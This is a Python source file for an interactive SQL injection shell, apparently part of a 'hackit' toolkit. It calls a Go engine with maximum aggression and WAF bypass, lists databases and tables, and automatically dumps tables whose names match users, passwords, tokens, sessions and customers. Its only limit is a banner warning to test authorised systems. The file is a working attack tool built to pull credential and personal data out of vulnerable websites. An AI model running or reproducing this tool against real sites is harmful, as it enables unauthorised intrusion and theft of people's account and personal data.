"""
SQLi PENETRATION ENGINE v4.0 — Interactive Shell
"""
import click
import json
import sys
import io
import re
import shlex
from datetime import datetime
from .go_bridge import GoEngine
from hackit.ui import _colored, BLUE, CYAN, YELLOW, RESET, MAGENTA, GREEN, RED, BOLD, WHITE

if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')


BANNER = f"""{GREEN}  ▄████████  ▄█   ▄█          ▄████████ ████████▄
 ███    ███ ███  ███         ███    ███ ███   ▀███
 ███    █▀  ███▌ ███         ███    █▀  ███    ███
 ███        ███▌ ███        ▄███▄▄▄     ███    ███
▀███████████ ███▌ ███       ▀▀███▀▀▀     ███    ███
         ███ ███  ███         ███    █▀  ███   ▄███
   ▄█    ███ ███  ██▌    ▄   ███    ███ ████████▀
 ▄████████▀  █▀   ███▄▄██   ██████████
{GREEN}─────────────────────────────────────────────────{RESET}
{CYAN}  SQLi Exploit Engine v3.0 (2270 Payloads / 20 Engines){RESET}
{YELLOW}  Developer  : AniipID{RESET}
{GREEN}─────────────────────────────────────────────────{RESET}
{YELLOW}  ⚠️  WARNING : Use only on systems you own or
     have explicit written permission to test!{RESET}
{GREEN}─────────────────────────────────────────────────{RESET}
"""

EXAMPLE_URL = "e.g. https://example.com/index.php?cat=2"


def _ts():
    return datetime.now().strftime('%H:%M:%S')


SYMBOLS = {
    "PLUS":     GREEN,
    "MINUS":    YELLOW,
    "CROSS":    RED,
    "ARROW":    GREEN,
}


def _log(symbol, tag, msg, bold=False):
    ts = _colored(f"[{_ts()}]", WHITE)
    sym_color = SYMBOLS.get(symbol, WHITE)
    tag_color = {
        "PLUS": GREEN, "MINUS": YELLOW, "CROSS": RED, "ARROW": GREEN,
    }.get(symbol, WHITE)
    sym = {"PLUS": "[+]", "MINUS": "[-]", "CROSS": "[x]", "ARROW": "[>]"}.get(symbol, "[+]")
    ts_color = WHITE

    sym_str = _colored(sym, sym_color, bold)
    tag_str = _colored(f"[{tag}]", tag_color, bold)
    click.echo(f"{sym_str} {ts_color}{ts}{RESET} {tag_str} {msg}")


def _log_backend_stack(stack):
    if not stack:
        return
    _log("PLUS", "", f"{GREEN}Back End Stack{RESET}", bold=False)
    for k, v in stack.items():
        _log("MINUS", "", f"{k}: {WHITE}{v}{RESET}")


def _log_success(msg):
    _log("ARROW", "SUCCESS", f"{GREEN}{msg}{RESET}", bold=True)


def _log_failure(msg):
    _log("ARROW", "FAILED", f"{RED}{msg}{RESET}", bold=True)


def _sqlmap_border(col_widths):
    parts = []
    for w in col_widths:
        parts.append('-' * (w + 2))
    return '+' + '+'.join(parts) + '+'


def _sqlmap_row(cols, col_widths):
    parts = []
    for i, c in enumerate(cols):
        w = col_widths[i]
        s = str(c)[:w].ljust(w)
        parts.append(f" {s} ")
    return '|' + '|'.join(parts) + '|'


def _draw_sqlmap_table(title, columns, rows):
    if not rows:
        return
    col_widths = [len(c) for c in columns]
    for row in rows:
        for i, c in enumerate(row):
            if len(str(c)) > col_widths[i]:
                col_widths[i] = min(len(str(c)), 48)
    for i, c in enumerate(columns):
        if len(c) > col_widths[i]:
            col_widths[i] = len(c)

    click.echo(f"\n{GREEN}{title}{RESET}")
    border = _sqlmap_border(col_widths)
    click.echo(f"{BLUE}{border}{RESET}")
    hdr = _sqlmap_row(columns, col_widths)
    click.echo(f"{CYAN}{hdr}{RESET}")
    click.echo(f"{BLUE}{border.replace('-', '=')}{RESET}")
    for row in rows:
        click.echo(f"{WHITE}{_sqlmap_row(row, col_widths)}{RESET}")
        click.echo(f"{BLUE}{border}{RESET}")
    click.echo()


INTERESTING_TABLES = [
    'user', 'admin', 'account', 'member', 'staff', 'credential',
    'customer', 'employee', 'person', 'login', 'passwd', 'secret',
    'token', 'session', 'users', 'admins', 'accounts', 'members',
    'credentials', 'customers', 'employees', 'people', 'logins',
    'passwords', 'secrets', 'tokens', 'sessions', 'auth', 'auth_user',
    'wp_users', 'user_login', 'user_pass', 'user_table', 'login_users',
    'admin_users', 'user_accounts', 'user_credentials', 'user_data',
    'user_info', 'user_profiles', 'user_roles', 'user_sessions',
    'password_resets', 'personal_info', 'profile', 'profiles',
    'user_password', 'user_email', 'user_name', 'user_role'
]


def _run_engine(url, **overrides):
    engine = GoEngine()
    if not engine.available:
        _log("CROSS", "CRITICAL", "Go is not installed.")
        return None
    opts = {
        'url': url,
        'risk_level': 5,
        'bypass_waf': True,
        'threads': 30,
        'timeout': 30,
        'depth': 5,
        'verbose': 2,
        'follow_redirect': True,
        'fingerprint': True,
        'banner_grab': True,
        'os_detect': True,
        'waf_detect': True,
        'tech_detect': True,
        'smart_diff': True,
        'list_dbs': True,
        'dump_all': True,
    }
    opts.update(overrides)
    results = engine.run(**opts)
    if results and isinstance(results, list) and len(results) > 0 and 'error' in results[0]:
        _log("CROSS", "CRITICAL", f"Engine error: {results[0]['error']}")
        return None
    return results


def _parse_enum(items_str):
    return [s.strip() for s in items_str.split(',') if s.strip()]


def _show_vuln_report(findings):
    if not findings:
        return
    _log("PLUS", "INFO", f"the back-end DBMS is {findings[0].get('dbms','Unknown')}")
    vuln_rows = []
    for i, r in enumerate(findings, 1):
        t = r.get('type', 'N/A')
        db = r.get('dbms', 'Unknown')
        conf = r.get('confidence', 0)
        vuln_rows.append([str(i), r.get('parameter', 'N/A'), t, db, f"{conf*100:.0f}%"])
    _draw_sqlmap_table("SQLi Vulnerability Report",
                       ["#", "Parameter", "Type", "DBMS", "Confidence"],
                       vuln_rows)
    _log("PLUS", "INFO", f"{len(findings)} vulnerability(-ies) found")


def _show_databases(enums):
    for e in enums:
        if e.get('type') == 'list-dbs':
            items = _parse_enum(e.get('payload', ''))
            click.echo()
            for x in items:
                _log("ARROW", "LIST DB", f"{GREEN}{x}{RESET}")
            click.echo()
            return items
    return []


def _auto_explore(url, findings, enums):
    db_list = _show_databases(enums)
    if not db_list:
        return

    skip_dbs = {'information_schema', 'mysql', 'performance_schema', 'sys',
                'pg_catalog', 'template0', 'template1', 'master', 'tempdb',
                'model', 'msdb'}
    target_db = None
    for db in db_list:
        if db.lower() not in skip_dbs:
            target_db = db
            break
    if not target_db:
        target_db = db_list[0]

    _log("PLUS", "INFO", f"auto-selected database: {_colored(target_db, CYAN)}")
    click.echo()

    tbl_res = _run_engine(url, list_tables=True, database=target_db)
    if not tbl_res:
        return
    tbl_enums = [r for r in tbl_res if r.get('type') == 'list-tables']
    all_tables = []
    for e in tbl_enums:
        items = _parse_enum(e.get('payload', ''))
        all_tables.extend(items)

    if not all_tables:
        _log("PLUS", "INFO", "no tables found")
        return

    _draw_sqlmap_table(f"Tables in {target_db} ({len(all_tables)})",
                       ["Table"], [[x] for x in all_tables])

    interesting = [t for t in all_tables if any(x in t.lower() for x in ['user','admin','account','credential','login','passwd','secret','token','member','customer','employee','person','staff','auth','profile','session'])]
    if interesting:
        _log("ARROW", "SUCCESS", f"found {len(interesting)} interesting table(s)!")
        for tbl in interesting:
            _log("PLUS", "INFO", f"dumping {_colored(tbl, CYAN)}...")
            dump_res = _run_engine(url, dump_table=tbl, database=target_db, verbose=1)
            if not dump_res:
                continue
            for dr in dump_res:
                if dr.get('type') == 'dump-table':
                    _log("PLUS", "PAYLOAD", f"Table: {dr.get('details', tbl)}")
                    payload = dr.get('payload', '')
                    if payload:
                        try:
                            data = json.loads(payload)
                            if isinstance(data, list):
                                _draw_sqlmap_table(f"Data in {tbl} ({len(data)} rows)",
                                                   list(data[0].keys()) if data else ["Data"],
                                                   [list(x.values()) for x in data])
                            elif isinstance(data, dict):
                                _draw_sqlmap_table(f"Data in {tbl}",
                                                   list(data.keys()),
                                                   [list(data.values())])
                            else:
                                click.echo(payload[:5000])
                        except (json.JSONDecodeError, IndexError):
                            click.echo(payload[:5000])


def _cmd_scan(url, args):
    _log("PLUS", "INFO", f"target URL: {url}")
    _log("PLUS", "INFO", "starting full scan with max aggression ...")
    click.echo()

    results = _run_engine(url)
    if results is None:
        return

    findings = [r for r in results if r.get('parameter') != "enumeration"]
    enums = [r for r in results if r.get('parameter') == "enumeration"]

    if findings:
        _show_vuln_report(findings)
        click.echo()
        for e in enums:
            if e.get('type') == 'list-dbs':
                items = _parse_enum(e.get('payload', ''))
                click.echo()
                for x in items:
                    _log("ARROW", "LIST DB", f"{GREEN}{x}{RESET}")
                click.echo()
            elif e.get('type') == 'list-tables':
                items = _parse_enum(e.get('payload', ''))
                click.echo(f"\n{GREEN}Tables in {e.get('details','?')} [{len(items)}]:{RESET}")
                for t in items:
                    click.echo(f"      [+] {t}")
                click.echo()
            elif e.get('type') == 'list-columns':
                items = _parse_enum(e.get('payload', ''))
                click.echo(f"    Columns ({e.get('details','?')}): {', '.join(items)}")
            elif e.get('type') == 'dump-table':
                payload = e.get('payload', '[]')
                detail = e.get('details', 'table')
                try:
                    data = json.loads(payload)
                    if data and isinstance(data, list):
                        click.echo(f"\n{GREEN}Data in {detail} ({len(data)} rows):{RESET}")
                        for row in data:
                            click.echo(f"      [+] {row[:200]}")
                except (json.JSONDecodeError, TypeError):
                    click.echo(f"      [+] {payload[:200]}")
    else:
        _log("PLUS", "INFO", "no SQL injection vulnerabilities detected")
        _log("MINUS", "WARNING", "try a different parameter or URL")


def _cmd_dbs(url, args):
    results = _run_engine(url, list_dbs=True)
    if results is None:
        return
    enums = [r for r in results if r.get('type') == 'list-dbs']
    _show_databases(enums)


def _cmd_tables(url, args):
    if not args:
        _log("MINUS", "WARNING", "usage: <url> tables <database>")
        return
    db = args[0]
    _log("PLUS", "INFO", f"listing tables in {_colored(db, CYAN)} ...")
    results = _run_engine(url, list_tables=True, database=db)
    if results is None:
        return
    items = []
    for r in results:
        if r.get('type') == 'list-tables':
            items = _parse_enum(r.get('payload', ''))
    if items:
        _draw_sqlmap_table(f"Tables in {db} ({len(items)})",
                           ["Table"], [[x] for x in items])


def _cmd_columns(url, args):
    if len(args) < 2:
        _log("MINUS", "WARNING", "usage: <url> columns <database> <table>")
        return
    db, tbl = args[0], args[1]
    _log("PLUS", "INFO", f"listing columns in {_colored(db, CYAN)}.{_colored(tbl, YELLOW)} ...")
    results = _run_engine(url, list_columns=True, database=db, table=tbl)
    if results is None:
        return
    items = []
    for r in results:
        if r.get('type') == 'list-columns':
            items = _parse_enum(r.get('payload', ''))
    if items:
        _draw_sqlmap_table(f"Columns in {db}.{tbl} ({len(items)})",
                           ["Column"], [[x] for x in items])


def _cmd_dump(url, args):
    if len(args) < 2:
        _log("MINUS", "WARNING", "usage: <url> dump <database> <table>")
        return
    db, tbl = args[0], args[1]
    _log("PLUS", "INFO", f"dumping {_colored(db, CYAN)}.{_colored(tbl, YELLOW)} ...")
    results = _run_engine(url, dump_table=tbl, database=db, verbose=1)
    if results is None:
        return
    for r in results:
        if r.get('type') == 'dump-table':
            payload = r.get('payload', '')
            detail = r.get('details', tbl)
            _log("PLUS", "PAYLOAD", f"Table: {detail}")
            if payload:
                try:
                    data = json.loads(payload)
                    if isinstance(data, list) and data:
                        _draw_sqlmap_table(f"Data in {tbl} ({len(data)} rows)",
                                           list(data[0].keys()),
                                           [list(x.values()) for x in data])
                    elif isinstance(data, dict):
                        _draw_sqlmap_table(f"Data in {tbl}",
                                           list(data.keys()),
                                           [list(data.values())])
                    else:
                        click.echo(payload[:5000])
                except (json.JSONDecodeError, IndexError):
                    click.echo(payload[:5000])


def _cmd_search(url, args):
    if len(args) < 2:
        _log("MINUS", "WARNING", "usage: <url> search <database> <keyword>")
        return
    db, keyword = args[0], ' '.join(args[1:])
    _log("PLUS", "INFO", f"searching for '{keyword}' in {_colored(db, CYAN)} ...")
    results = _run_engine(url, search=keyword, database=db)
    if results is None:
        return
    for r in results:
        if r.get('type') == 'search':
            click.echo(r.get('payload', '')[:2000])


def _cmd_schema(url, args):
    if not args:
        _log("MINUS", "WARNING", "usage: <url> schema <database>")
        return
    db = args[0]
    _log("PLUS", "INFO", f"enumerating schema for {_colored(db, CYAN)} ...")
    results = _run_engine(url, list_tables=True, database=db)
    if results is None:
        return
    tables = []
    for r in results:
        if r.get('type') == 'list-tables':
            tables = _parse_enum(r.get('payload', ''))
    if not tables:
        return
    for tbl in tables:
        col_res = _run_engine(url, list_columns=True, database=db, table=tbl)
        if col_res is None:
            continue
        cols = []
        for r in col_res:
            if r.get('type') == 'list-columns':
                cols = _parse_enum(r.get('payload', ''))
        _log("PLUS", "INFO", f"  {_colored(tbl, CYAN)} ({len(cols)} cols): {', '.join(cols)}")


def _cmd_rows(url, args):
    if not args:
        _log("MINUS", "WARNING", "usage: <url> rows <database>")
        return
    db = args[0]
    _log("PLUS", "INFO", f"counting rows in {_colored(db, CYAN)} ...")
    results = _run_engine(url, list_tables=True, database=db)
    if results is None:
        return
    tables = []
    for r in results:
        if r.get('type') == 'list-tables':
            tables = _parse_enum(r.get('payload', ''))
    if not tables:
        return
    row_data = []
    for tbl in tables:
        cnt_res = _run_engine(url, count_rows=True, database=db, table=tbl)
        if cnt_res is None:
            continue
        for r in cnt_res:
            if r.get('type') == 'count-rows':
                row_data.append([tbl, r.get('payload', '?')])
    if row_data:
        _draw_sqlmap_table(f"Row counts in {db}",
                           ["Table", "Rows"], row_data)


COMMANDS = {
    'dbs':       _cmd_dbs,
    'databases': _cmd_dbs,
    'database':  _cmd_tables,
    'tables':    _cmd_tables,
    'table':     _cmd_tables,
    'columns':   _cmd_columns,
    'cols':      _cmd_columns,
    'dump':      _cmd_dump,
    'search':    _cmd_search,
    'schema':    _cmd_schema,
    'rows':      _cmd_rows,
}

HELP_TEXT = f"""{CYAN}SQLi Interactive Shell - Commands:{RESET}

  <url>                         Full auto-scan → dbs → tables → dump interesting
  <url> {YELLOW}dbs{RESET}                   List databases
  <url> {YELLOW}database{RESET} <db>         List tables in database
  <url> {YELLOW}tables{RESET} <db>           List tables in database
  <url> {YELLOW}columns{RESET} <db> <tbl>    List columns in table
  <url> {YELLOW}dump{RESET} <db> <tbl>       Dump table data
  <url> {YELLOW}search{RESET} <db> <kw>      Search keyword in database
  <url> {YELLOW}schema{RESET} <db>           Full schema enumeration
  <url> {YELLOW}rows{RESET} <db>             Count rows per table

  {YELLOW}help{RESET}                        Show this help
  {YELLOW}exit{RESET} / {YELLOW}quit{RESET}              Exit
  {YELLOW}clear{RESET}                       Clear screen

{WHITE}Examples:{RESET}
  Input Target : https://example.com/index.php?id=1
  Input Target : https://example.com/index.php?id=1 database information_schema
  Input Target : https://example.com/index.php?id=1 dump information_schema schemata
"""


def interactive_shell():
    click.echo(BANNER)
    _log("PLUS", "INFO", f"starting @ {datetime.now().strftime('%H:%M:%S /%Y-%m-%d/')}")
    _log("PLUS", "INFO", EXAMPLE_URL)
    _log("PLUS", "INFO", "Type 'help' for commands")
    click.echo()

    while True:
        try:
            raw = click.prompt(f"{GREEN}Input Target{RESET}", prompt_suffix=' : ')
        except (EOFError, KeyboardInterrupt):
            click.echo()
            _log("PLUS", "INFO", "exiting ...")
            break

        raw = raw.strip()
        if not raw:
            continue

        if raw in ('exit', 'quit'):
            _log("PLUS", "INFO", "exiting ...")
            break

        if raw == 'clear':
            click.clear()
            click.echo(BANNER)
            continue

        if raw == 'help':
            click.echo(HELP_TEXT)
            continue

        parts = shlex.split(raw)
        url = parts[0]

        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url

        cmd = parts[1].lower() if len(parts) > 1 else None
        cmd_args = parts[2:] if len(parts) > 2 else []

        if cmd is None:
            _cmd_scan(url, [])
        elif cmd in COMMANDS:
            COMMANDS[cmd](url, cmd_args)
        else:
            _log("MINUS", "WARNING", f"unknown command: {cmd}")
            _log("PLUS", "INFO", "Type 'help' for available commands")


@click.command(context_settings=dict(help_option_names=['-h', '--help']))
@click.pass_context
def test_sqli(ctx):
    """SQLi Penetration Engine - Interactive Shell"""
    interactive_shell()


if __name__ == "__main__":
    test_sqli()
